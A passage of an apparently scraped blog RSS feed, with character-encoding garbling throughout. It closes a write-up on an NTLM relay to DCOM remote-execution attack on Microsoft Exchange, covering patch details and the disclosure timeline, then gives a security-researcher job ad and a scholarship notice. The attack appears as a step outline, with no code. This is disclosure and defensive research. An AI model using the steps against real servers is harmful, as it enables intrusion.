  &lt;li&gt;Coerce &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01&lt;/code&gt; to initiate a connection, and relay the NTLM to the Endpoint Mapper (port 135) of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt; to get the Interface of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MMC20.Application&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Coerce &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01&lt;/code&gt; again, and relay the NTLM to the dynamic port allocated by the EPMapper, and call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExecuteShellCommand(...)&lt;/code&gt; under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iMMC-&amp;gt;Document-&amp;gt;ActiveView&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Run arbitrary commands for fun and profit!&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Writing the whole exploit is fun, just like mixing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dcomexec.py&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntlmrelayx.py&lt;/code&gt; together. It‚Äôs recommended to write your own exploit code by hand for those who want to understand the DCOM mechanism more!&lt;/p&gt;

&lt;h3 id=&quot;patching-dcom&quot;&gt;Patching DCOM&lt;/h3&gt;

&lt;p&gt;Microsoft assigned &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26414&quot;&gt;CVE-2021-26414&lt;/a&gt; and patch this DCOM-relay in June 2021. However, due to compatibility, &lt;strong&gt;the hardening on the server-side is disabled by default&lt;/strong&gt;. Server Admin has to manually activate the patch by creating the following registry key. If Server Admin didn‚Äôt read the documentation carefully, his Exchange Server is probably still vulnerable after the June patch.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole\AppCompat\RequireIntegrityActivationAuthenticationLevel&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;As for when will the protection be enforced on server side? According to the FAQ under the CVE page, Microsoft has addressed a three-phase rollout to fully mitigate this issue. Now, it‚Äôs on phase one, and the patch won‚Äôt be activated by default until June 14, 2022. So, at the time of this writing, this RCE is still exploitable on the latest version of Exchange Server!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. Microsoft hash announce the second phase and enabled the hardening on the server-side by default on June 14, 2022. Exchange Server that installed the latest Windows patch should be safe now&lt;/em&gt;
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;round-4---relay-to-other-exchange-services&quot;&gt;Round 4 - Relay to Other Exchange Services‚Ä¶&lt;/h2&gt;

&lt;p&gt;Services that use NTLM as their authentication method on Exchange Server might be vulnerable, too. At the time of this writing, we have already found and reported one to MSRC. We believe there should be more, and this is a good target for those who want to discover vulnerabilities on Exchange Server!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;closing&quot;&gt;Closing&lt;/h1&gt;

&lt;p&gt;Here, this series has finally come to an end. Over the past two years, many ups and downs made this journey unusual. From the earliest bug collision with the bad actor, ITW panic, to the Pwn2Own hacking competition, and our talks got acceptance at top-level hacker conferences, we have a clear conscience that we didn‚Äôt do anything wrong. However, without understanding the context, there were lots of incorrect speculations and inaccurate media reports toward our company and me; there were even low blows to us‚Ä¶ that sucks.&lt;/p&gt;

&lt;p&gt;Although there were also happy moments, such as winning our first Master-of-Pwn champion at the top-hacking competition Pwn2Own and got the Best Server-Side bug of Pwnie Awards, the gossip and troll really harassed and depressed me a lot‚Ä¶&lt;/p&gt;

&lt;p&gt;Congratulate that I can finally close this research and start my new hacking. I am nothing but a security nerd who would rather spend more time on hacks, and please don‚Äôt blame me if my sentences are sometimes short and unclear; it‚Äôs not easy to express things in an unfamiliar language. It took me about 4x~5x times to arrange a presentation or article in a non-native language; lots of words were lost during refining.&lt;/p&gt;

&lt;p&gt;Hope that one day, there will be no language barrier. In a bar, with beers, we can talk about hacks, the culture, and hacking all night!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;timeline&quot;&gt;Timeline&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Jun 02, 2021&lt;/strong&gt; - We reported the vulnerability to Microsoft through the MSRC portal.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jun 03, 2021&lt;/strong&gt; - MSRC opened the case. (No. 65594)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jun 03, 2021&lt;/strong&gt; - We attached a 90-days Vulnerability Disclosure Policy to MSRC. The deadline is &lt;strong&gt;Sep 01, 2021&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jun 11, 2021&lt;/strong&gt; - MSRC replied that they are aiming to complete it before September.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jul 22, 2021&lt;/strong&gt; - MSRC said the case doesn‚Äôt look like it will be fully resolved by September.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jul 25, 2021&lt;/strong&gt; - We said we could extend the deadline and let us know the new estimated date.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Aug 25, 2021&lt;/strong&gt; - We asked for the estimated date again.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Sep 01, 2021&lt;/strong&gt; - MSRC said this case has been expanding into a design change and the intended release date is &lt;strong&gt;December 2021&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Sep 08, 2021&lt;/strong&gt; - We asked is it possible to shorten the time frame because we would like to disclose this at conferences.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Sep 17, 2021&lt;/strong&gt; - MSRC replied there are not quick and simple fixes but design level changes, they can‚Äôt get the changes in October.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Oct 25, 2021&lt;/strong&gt; - We decided not to disclose this at conferences and gave the team a fair time for fixing and testing. We hoped this bug could be fixed as scheduled in December 2021.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Dec 21, 2021&lt;/strong&gt; - We asked for updates on this case.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Dec 22, 2021&lt;/strong&gt; - MSRC replied they aimed to include this patch in a CU (Cumulative Update) instead of an SU (Security Update) due to the level of changes. The next CU release date will be in &lt;strong&gt;March 2022&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Apr 04, 2022&lt;/strong&gt; - We asked that we don‚Äôt see the CU in March. When is the new release date?&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Apr 13, 2022&lt;/strong&gt; - MSRC replied the CU is delayed, and the current release date is on &lt;strong&gt;April 20, 2022&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Apr 20, 2022&lt;/strong&gt; - Microsoft released &lt;a href=&quot;https://support.microsoft.com/en-au/topic/cumulative-update-12-for-exchange-server-2019-kb5011156-6a4e598a-876c-4ff1-9cfa-f7b87246f1d8&quot;&gt;Exchange Server 2019 CU 12&lt;/a&gt; and &lt;a href=&quot;https://support.microsoft.com/en-us/topic/cumulative-update-23-for-exchange-server-2016-kb5011155-98183ada-e4cd-465f-b201-69d40fb74678&quot;&gt;Exchange Server 2016 CU 23&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Apr 21, 2022&lt;/strong&gt; - We found our exploit still works fine on the latest version of Exchange Server and asked is this bug really fixed?&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Apr 27, 2022&lt;/strong&gt; - MSRC replied the CU contain the code change, but it needs to be activated manually or with a script. There are still some testing concerns but the manual activation process will be public on &lt;strong&gt;May 10, 2022&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;May 11, 2022&lt;/strong&gt; - MSRC said the documentation and the script are mapped for the Patching Tuesday of June 2022 (&lt;strong&gt;Jun 14, 2022&lt;/strong&gt;).&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jun 10, 2022&lt;/strong&gt; - MSRC said there are still having some issues on testing and they are looking to release this in &lt;strong&gt;July 2022&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jul 04, 2022&lt;/strong&gt; - We asked if it will release in this month‚Äôs Patching Tuesday.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Aug 10, 2022&lt;/strong&gt; - Don‚Äôt see anything, asked again.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Aug 18, 2022&lt;/strong&gt; - Microsoft released the CVE and &lt;a href=&quot;https://techcommunity.microsoft.com/t5/exchange-team-blog/released-august-2022-exchange-server-security-updates/ba-p/3593862&quot;&gt;the patch activation documentation&lt;/a&gt;!&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/</link>
                <guid>https://devco.re/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay</guid>
                <pubDate>Wed, 19 Oct 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE ÂæµÊ±ÇË≥áÂÆâÁ†îÁ©∂Âì°</title>
                <description>&lt;p&gt;‰Ω†Â∞çË≥áÂÆâÁ†îÁ©∂ÊúâÊªøËÖîÁÜ±Ë°Ä‰ΩÜÂçªÊâæ‰∏çÂà∞‰∫∫Ë®éË´ñÂóéÔºü
Â∏∏Â∏∏ÂèÉÂä†ÂêÑÂ§ß CTF ÊØîË≥ΩÔºåÂçª‰∏çÁü•Â¶Ç‰ΩïÂ∞áÂ≠∏ÊúÉÁöÑÊäÄËÉΩÁôºÊèÆÂú®ÁúüÂØ¶‰∏ñÁïå‰∏≠ÂóéÔºü
‰Ω†‰πüÊÉ≥Ë¶ÅÁÇ∫‰øùË≠∑‰∏ñÁïåÁõ°‰∏Ä‰ªΩÂøÉÂäõÂóéÔºü&lt;/p&gt;

&lt;p&gt;DEVCORE Research Team ÊàêÁ´ãÊï∏Âπ¥‰æÜÊåÅÁ∫åÁ†îÁ©∂ÊúÄÂâçÁûªÁöÑË≥áÂÆâÊäÄË°ìÔºåÂõûÂ†±ÈÅéÂ§öÂÄã‰∏ñÁïåÁ¥öÁöÑÊºèÊ¥ûÔºåÂú® Black Hat„ÄÅDEFCON Á≠âÂúãÈöõË≥áÂÆâÁ†îË®éÊúÉÈÉΩËÉΩÁúãË¶ãÊàëÂÄëÁöÑÊà∞Á∏æÔºåPwnie Awards„ÄÅBest Web Hacking Techniques ÂêÑÁ®ÆÁçéÈ†ÖÊàëÂÄë‰πüÊØ´‰∏çÁïôÊÉÖÂú∞Ê©´ÊéÉÔºåÂú® Pwn2Own Èß≠ÂÆ¢Â§ßË≥Ω‰∏≠Êõ¥ÊòØÂàóÂ±ÖÈ¶ñ‰ΩçÔºÅÁÑ∂ËÄåÔºåË≥áÂÆâÈ†òÂüü‰πãÂª£„ÄÅÊõ¥Ëø≠ÈÄüÂ∫¶‰πãÂø´ÔºåÂñÆÊÜëÂØ•ÂØ•Êï∏‰∫∫‰πüÊòØÂäõÊúâÊú™ÈÄÆÔºå&lt;/p&gt;

&lt;p&gt;‰∏ÄÂÄã‰∫∫Ëµ∞ÔºåÂèØ‰ª•Ëµ∞ÂæóÂæàÂø´Ôºõ‰ΩÜ‰∏ÄÁæ§‰∫∫Ëµ∞ÔºåÂèØ‰ª•Ëµ∞ÂæóÊõ¥ÈÅ†„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊïÖÊ≠§ÔºåWe Need YOU!&lt;/p&gt;

&lt;p&gt;ÁèæÂú®ÔºåDEVCORE Research Team ÂÖ¨ÈñãÂæµÊ±ÇË≥áÂÆâÁ†îÁ©∂Âì°ÂõâÔºÅ‰∏çË´ñ‰Ω†ÊòØÂ∞àÁ≤æÊñºÁ∂≤È†ÅÂÆâÂÖ®ÔºåÊàñÊòØÂ∞çÈÄÜÂêëÂ∑•Á®ãÊÉÖÊúâÁç®ÈçæÔºåÁîöËá≥‰Ω†ÂñúÊ≠°ÂãïÊâãÊãÜËß£Á°¨È´îÔºåÊàëÂÄë‰∏çÈúÄË¶Å‰Ω†ÁöÑËÇùÔºåÂè™ÈúÄË¶Å‰Ω†Â∞çÊñºË≥áÂÆâÁ†îÁ©∂ÁöÑÁÜ±Âø±ÔºÅÊàëÂÄëÁúãÈáçÁöÑ‰∏çÊòØÂ∑•‰ΩúÁ∂ìÈ©óÔºåËÄåÊòØÂ∞çË≥áÂÆâÂÇæÊ≥®ÈÅéÂ§öÂ∞ëÂøÉÂäõÔºÅ&lt;/p&gt;

&lt;p&gt;Âú®ÈÄôË£°Â∑•‰ΩúÔºå‰Ω†Â∞áÂèØ‰ª•ÂæóÂà∞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ËàáÈ†ÇÂ∞ñÈß≠ÂÆ¢‰∏ÄËµ∑‰∫§ÊµÅ„ÄÅÂêà‰ΩúÁöÑÂØ∂Ë≤¥Á∂ìÈ©ó&lt;/li&gt;
  &lt;li&gt;ÂØ¶ÈöõÈ´îÈ©ó‰∏¶ÊåñÊéò Real World ÊºèÊ¥ûÔºåÊâæÂà∞Â±¨ÊñºËá™Â∑±ÁöÑÁ¨¨‰∏ÄÂÄã CVEÔºÅ&lt;/li&gt;
  &lt;li&gt;Ê∑±ÂÖ•Ê•≠ÁïåÂØ¶Êà∞ÊîªÈò≤ÔºåÁúüÂØ¶ÊÑüÂèóÊºèÊ¥ûÁ†îÁ©∂Ëàá‰ºÅÊ•≠Ë≥áÂÆâÁöÑÁµêÂêà&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÊÉ≥ÊääÈß≠ÂÆ¢‰ΩúÁÇ∫‰Ω†ÁöÑÁµÇË∫´ËÅ∑ÂóéÔºüÊ≠°ËøéÂêÑÈ†òÂüüÁöÑÈß≠ÂÆ¢ÂÄë‰∏ÄËµ∑Âä†ÂÖ•ÔºÅ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;Â∑•‰ΩúÂÖßÂÆπ&quot;&gt;Â∑•‰ΩúÂÖßÂÆπ&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;ÂÄã‰∫∫Á†îÁ©∂ 70%
    &lt;ul&gt;
      &lt;li&gt;Â∞çÂΩ±Èüø‰∏ñÁïåÁöÑÁî¢ÂìÅÈÄ≤Ë°åÊºèÊ¥ûÁ†îÁ©∂&lt;/li&gt;
      &lt;li&gt;Â∞áÊâæÂà∞ÁöÑÊºèÊ¥ûÂõûÂ†±Âª†ÂïÜ‰∏¶ÈÄ≤Ë°åÊºèÊ¥ûÁôºË°®&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Ê™¢Ê∏¨ÊàñÂçîÂä©Â∞àÊ°à 30%
    &lt;ul&gt;
      &lt;li&gt;Ë¶èÂäÉ„ÄÅÂü∑Ë°åÁî¢ÂìÅÂÆâÂÖ®Ê∏¨Ë©¶&lt;/li&gt;
      &lt;li&gt;Ê†πÊìöÊ™¢Ê∏¨ÈúÄÊ±ÇÔºåÁ†îÁ©∂Áõ∏ÈóúÂº±ÈªûÊàñÈñãÁôºÁõ∏ÈóúÂ∑•ÂÖ∑&lt;/li&gt;
      &lt;li&gt;ÂçîÂä©Á¥ÖÈöäÂü∑Ë°åÂ∞àÊ°àÔºåÊèê‰æõÊäÄË°ìÁÅ´ÂäõÊîØÊè¥&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Â∑•‰ΩúÊ¢ù‰ª∂Ë¶ÅÊ±Ç&quot;&gt;Â∑•‰ΩúÊ¢ù‰ª∂Ë¶ÅÊ±Ç&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÊºèÊ¥ûÊåñÊéòËÉΩÂäõ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÊºèÊ¥ûÂà©Áî®Á®ãÂºèÊí∞ÂØ´ËÉΩÂäõ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÂü∫Êú¨Á®ãÂºèË™ûË®ÄÈñãÁôºËÉΩÂäõ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÁ†îÁ©∂ÁÜ±Ë™†ÔºåÁøíÊÖ£‰∫ÜËß£ÊäÄË°ìÊú¨Ë≥™&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÁâπÂÆöÈ†òÂüüË≥áÂÆâÁõ∏ÈóúÁü•Ë≠òÔºåÂåÖÂê´‰ΩÜ‰∏çÈôêÊñº
    &lt;ul&gt;
      &lt;li&gt;‰∏ªÊµÅ‰ΩúÊ•≠Á≥ªÁµ±ÈÅã‰ΩúÊ©üÂà∂„ÄÅÁõ∏ÈóúÊºèÊ¥ûÂèäÂÖ∂Âà©Áî®ÊäÄË°ì&lt;/li&gt;
      &lt;li&gt;‰∏ªÊµÅÁÄèË¶ΩÂô®Êû∂Êßã„ÄÅÁõ∏ÈóúÊºèÊ¥ûÂèäÂÖ∂Âà©Áî®ÊäÄË°ì&lt;/li&gt;
      &lt;li&gt;Á°¨È´î‰ªãÈù¢Áõ∏ÈóúÊîªÊìäÊâãÊ≥ï„ÄÅÂÖ∑ÂØ¶‰ΩúÁ∂ìÈ©ó&lt;/li&gt;
      &lt;li&gt;ÊâãÊ©üÂ∫ïÂ±§ÈüåÈ´îÊû∂ÊßãÂèäÈò≤Á¶¶Ê©üÂà∂&lt;/li&gt;
      &lt;li&gt;Á∂≤È†ÅÊáâÁî®Á®ãÂºèÊîªÊìäÊâãÊ≥ï&lt;/li&gt;
      &lt;li&gt;Á∂≤Ë∑ØÁõ∏ÈóúÊîªÊìäÊâãÊ≥ï&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Âä†ÂàÜÊ¢ù‰ª∂&quot;&gt;Âä†ÂàÜÊ¢ù‰ª∂&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;CTF ÊØîË≥ΩÁ∂ìÈ©ó&lt;/li&gt;
  &lt;li&gt;pwnable.tw ÊàêÁ∏æ&lt;/li&gt;
  &lt;li&gt;Flare-On ÊàêÁ∏æ&lt;/li&gt;
  &lt;li&gt;ÂÖ¨ÈñãÁöÑÊäÄË°ì blog/slide/write-ups Êàñ side projects&lt;/li&gt;
  &lt;li&gt;Bug Bounty / ÊºèÊ¥ûÂõûÂ†±Á∂ìÈ©ó&lt;/li&gt;
  &lt;li&gt;Ë≥áÂÆâÁ†îË®éÊúÉÊºîË¨õÁ∂ìÈ©ó&lt;/li&gt;
  &lt;li&gt;Ë≥áÂÆâÁõ∏ÈóúÊïôÂ≠∏Á∂ìÈ©ó&lt;/li&gt;
  &lt;li&gt;ÂñúÊ≠°Ëá™Â∑±ÂãïÊâãÊí∞ÂØ´Â∑•ÂÖ∑&lt;/li&gt;
  &lt;li&gt;‰∏ªÂãïËøΩËπ§‰∏¶Â≠∏ÁøíÊúÄÊñ∞Ë≥áÂÆâÁõ∏ÈóúÊäÄË°ì&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Ëµ∑Ëñ™ÁØÑÂúç&quot;&gt;Ëµ∑Ëñ™ÁØÑÂúç&lt;/h3&gt;
&lt;p&gt;Êñ∞Âè∞Âπ£ 80,000 - 100,000 Ôºà‰øùË≠âÂπ¥Ëñ™ 14 ÂÄãÊúàÔºâ&lt;/p&gt;

&lt;p&gt;Ë©≥Á¥∞ÁöÑÂ∑•‰ΩúÁí∞Â¢ÉËàáÊáâÂæµÊñπÂºèË´ãÂèÉËÄÉ&lt;a href=&quot;https://devco.re/company/jobs/&quot;&gt;ÊãõÂãüÈ†ÅÈù¢&lt;/a&gt;&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2022/09/21/202209-security-researcher-recruitment/</link>
                <guid>https://devco.re/blog/2022/09/21/202209-security-researcher-recruitment</guid>
                <pubDate>Wed, 21 Sep 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Êà¥Â§´ÂØáÁàæÊåÅÁ∫åÊäïÂÖ•Ë≥áÂÆâ‰∫∫ÊâçÂüπËÇ≤ - ÂïüÂãïÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏ÈáëË®àÂäÉ„ÄÅÂª∂Á∫åË≥áÂÆâÊïôËÇ≤Ê¥ªÂãïË¥äÂä©Ë®àÂäÉ</title>
                <description>&lt;p&gt;Êà¥Â§´ÂØáÁàæËá™ 2012 Âπ¥ÊàêÁ´ã‰ª•‰æÜÔºåÁßâÊåÅËëóÁÇ∫Âè∞ÁÅ£Á¥ØÁ©çÊõ¥Ë±êÂéöÁöÑË≥áÂÆâÁ´∂Áà≠ÂäõÔºå‰∏çÂè™ÈÄèÈÅé‰∏ªÂãïÂºèË≥áÂÆâÊúçÂãôÂçîÂä©‰ºÅÊ•≠Ê™¢Ê∏¨Ë≥áÂÆâÈò≤Á¶¶ÔºåÈÄ≤ËÄåÊèêÂçáÊï¥È´îË≥áÂÆâÈ´îË≥™ÔºõÂêåÊôÇÊàëÂÄë‰πüÂæàÈóúÊ≥®Ë≥áÂÆâÊäÄË°ì‰∫∫ÊâçÁöÑÂüπËÇ≤ÔºåÈô§‰∫ÜÊìî‰ªªÂ≠∏Ë°ì„ÄÅÊîøÂ∫úÂñÆ‰ΩçÂ∞à‰ªªË¨õÂ∏´ÂèäÈ°ßÂïè‰ª•Â§ñÔºå‰πüÈï∑ÊúüÊîØÊåÅÂ≠∏ÁîüÊôÇÊúüÂâµËæ¶ÁöÑÊ†°ÂúíË≥áÂÆâÁ§æÂúò NISRAÔºàNetwork and Information Security Research AssociationÔºâÔºåÂπ´Âä©Â≠∏ÁîüÂÄëÂæûÂ≠∏ÁîüÊôÇ‰ª£Âª∫ÊßãÊ≠£Á¢∫ÁöÑË≥áË®äÂÆâÂÖ®ÊÑèË≠òÂèäÊäÄËÉΩÂ§ñÔºå‰πüÊõ¥Êó©Áû≠Ëß£Ë≥áÂÆâÁî¢Ê•≠ÁöÑÁèæÊ≥ÅÔºåËàáÁî¢Ê•≠ÁïåÊé•Ëªå„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëøë‰æÜÁî¢Ê•≠Á¥õÁ¥õÂä†ÈÄüÊï∏‰ΩçËΩâÂûãËÖ≥Ê≠•ÔºåË≥áÂÆâ‰∫ã‰ª∂È†ªÂÇ≥ÔºåÂä†‰∏äÁõ∏ÈóúÊ≥ïË¶èÁöÑÂ¢ûË®≠ÂèäÊñΩË°åÔºåÊàëÂÄë‰πüËßÄÂØüÂà∞Ë≥áÂÆâÈáçË¶ÅÊÄßÁöÑÈóúÊ≥®Â∫¶ÈÉΩÂ§ßÂπÖÊèêÈ´òÔºåÁÇ∫‰∫ÜÂüπÈ§äÊõ¥Â§ö‰∫∫ÂèØ‰ª•ÁêÜËß£„ÄåÈß≠ÂÆ¢ÊÄùÁ∂≠„Äç„ÄÅËÉΩÊ®°Êì¨Èß≠ÂÆ¢ÊîªÊìäÊÉÖÂ¢É„ÄÅÊâæÂá∫ÊΩõÂú®Ë≥áÂÆâÈ¢®Èö™ÔºåÊàëÂÄëÂ∞áÊì¥Â§ßÊñΩË°å„ÄåË≥áÂÆâ‰∫∫ÊâçÂüπËÇ≤Ë®àÁï´„ÄçÔºåÈÄèÈÅé&lt;strong&gt;Êà¥Â§´ÂØáÁàæÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë&lt;/strong&gt;Âèä&lt;strong&gt;Ë¥äÂä©Ë≥áÂÆâÊïôËÇ≤Ê¥ªÂãï&lt;/strong&gt;Á≠âÔºåÊîØÊåÅÊõ¥Â§öÂøóÂêåÈÅìÂêàÁöÑÂ≠∏Â≠êÂÄëÈóúÊ≥®Ë≥áÂÆâË≠∞È°åÔºåÂèäÊó©Â¢ûÂº∑Ë≥áÂÆâÊäÄËÉΩ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÊîØÊåÅ‰∏ã‰∏Ä‰ª£Ë≥áÂÆâ‰∫∫Êâç---Êà¥Â§´ÂØáÁàæÂïüÂãïÊà¥Â§´ÂØáÁàæÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏ÈáëË®àÂäÉ&quot;&gt;ÊîØÊåÅ‰∏ã‰∏Ä‰ª£Ë≥áÂÆâ‰∫∫Êâç - Êà¥Â§´ÂØáÁàæÂïüÂãï„ÄåÊà¥Â§´ÂØáÁàæÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë„ÄçË®àÂäÉ&lt;/h3&gt;

&lt;p&gt;ÊàëÂÄëÂæûÂ≠∏ÁîüÊôÇ‰ª£Â∞±ÁÜ±Ë°∑ÊñºË≥áÂÆâÁ†îÁ©∂Ôºå‰πüÈÄèÈÅéÊ†°ÂúíË™≤Á®ã„ÄÅÁ§æÂúò NISRA Áç≤ÂæóÂÖÖÂØ¶ÁöÑË≥áÂÆâÁü•Ë≠òÔºåÊúâÊÑüÊñºÊ≠§ÔºåÊàëÂÄëÂâµÁ´ãÊà¥Â§´ÂØáÁàæÂæå‰πüÁÇ∫ÊØçÊ†°‚ÄîÂ§©‰∏ªÊïôËºî‰ªÅÂ§ßÂ≠∏„ÄÅÂúãÁ´ãËá∫ÁÅ£ÁßëÊäÄÂ§ßÂ≠∏ÁöÑÂ≠∏ÁîüË®≠Á´ã‰∫ÜÁçéÂ≠∏ÈáëË®àÁï´ÔºåÁÇ∫Â≠∏ÁîüÁöÑË≥áÂÆâÂ≠∏Áøí‰πãË∑ØÂ•âÁçª‰∏ÄÈªûÂäõÈáè„ÄÇ&lt;/p&gt;

&lt;p&gt;Ê≠§Ë®àÁï´Âú® 2022Âπ¥Ôºà111 Â≠∏Âπ¥Â∫¶ÔºâÂ∑≤ÈÇÅÂÖ•Á¨¨ 4 Âπ¥ÔºåÊàëÂÄë‰πüÊì¥Â§ßË£úÂä©ÁöÑÁØÑÁñáÔºåÈ¶ñÂ∫¶ÁÇ∫ÂÖ®ÂúãÂ§ßÂ∞àÈô¢Ê†°Â≠∏ÁîüÊé®Âá∫„ÄåÊà¥Â§´ÂØáÁàæÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë„ÄçÔºåÂè™Ë¶ÅÂú®Ë≥áË®äÂÆâÂÖ®È†òÂüüÊúâÂá∫ÁúæÁ†îÁ©∂ÊàêÊûúÁöÑÂ≠∏ÁîüÔºåÁöÜÂèØ‰ª•Áî≥Ë´ã„ÄåÊà¥Â§´ÂØáÁàæÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë„ÄçË£úÂä©ÔºåÂπ´Âä©Â§ßÂÆ∂Âú®Ê±ÇÂ≠∏ÊúüÈñìÊõ¥Âä†Â∞àÊ≥®Â≠∏Áøí„ÄÅÂ•†ÂÆöË≥áÂÆâÂ∞àÈï∑ÔºåÈÄ≤ËÄåÂΩ¢ÊàêÊ≠£ÂêëÂæ™Áí∞„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊúâÊÑèÁî≥Ë´ãËÄÖÈúÄÊèêÂá∫Â≠∏ÁøíË≥áÂÆâÁöÑÂãïÊ©üËàáÊ≠∑Á®ãÔºå‰∏¶Áπ≥‰∫§Ë≥áÂÆâÁ†îÁ©∂ÊàñÊØîË≥ΩÊàêÊûúÔºåÁç≤ÈÅ∏ËÄÖÂ∞áËÉΩÂæóÂà∞ÊúÄÈ´ò 2 Ëê¨ÂÖÉÁöÑÁ†îÁ©∂Ë£úÂä©ÔºåÂÖ± 10 Âêç„ÄÇË©≥Á¥∞Áî≥Ë´ãËæ¶Ê≥ïË´ãË¶ã‰ª•‰∏ãÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Áî≥Ë´ãË≥áÊ†º&lt;/strong&gt;ÔºöÂÖ®ÂúãÂêÑÂ§ßÂ∞àÈô¢Ê†°Â≠∏ÁîüÁöÜÂèØ‰ª•Áî≥Ë´ã„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ÁçéÂ≠∏ÈáëÈáëÈ°ç/ÂêçÈ°ç&lt;/strong&gt;ÔºöÊØèÂπ¥Â∫¶Âèñ 10 ÂêçÔºåÊØèÂêçÂèØÁç≤ÂæóÁçéÂ≠∏ÈáëÊñ∞Âè∞Âπ£ 20,000 ÂÖÉÊï¥ÔºåÂÖ±Ë®à 20 Ëê¨ÂÖÉ„ÄÇÂ¶ÇÂ†±ÂêçË∏¥Ë∫çÊàëÂÄëÂ∞áË¶ñÁî≥Ë´ãÁãÄÊ≥ÅÂ¢ûÂä†ÂêçÈ°ç„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Áî≥Ë´ãÊôÇÁ®ã&lt;/strong&gt;Ôºö
    &lt;ul&gt;
      &lt;li&gt;2022/8/31 ÂÆòÁ∂≤ÂÖ¨ÂëäÁçéÂ≠∏ÈáëË®àÁï´Ë≥áË®ä&lt;/li&gt;
      &lt;li&gt;2022/9/1 - 2022/9/30 ÈñãÊîæÊî∂‰ª∂&lt;/li&gt;
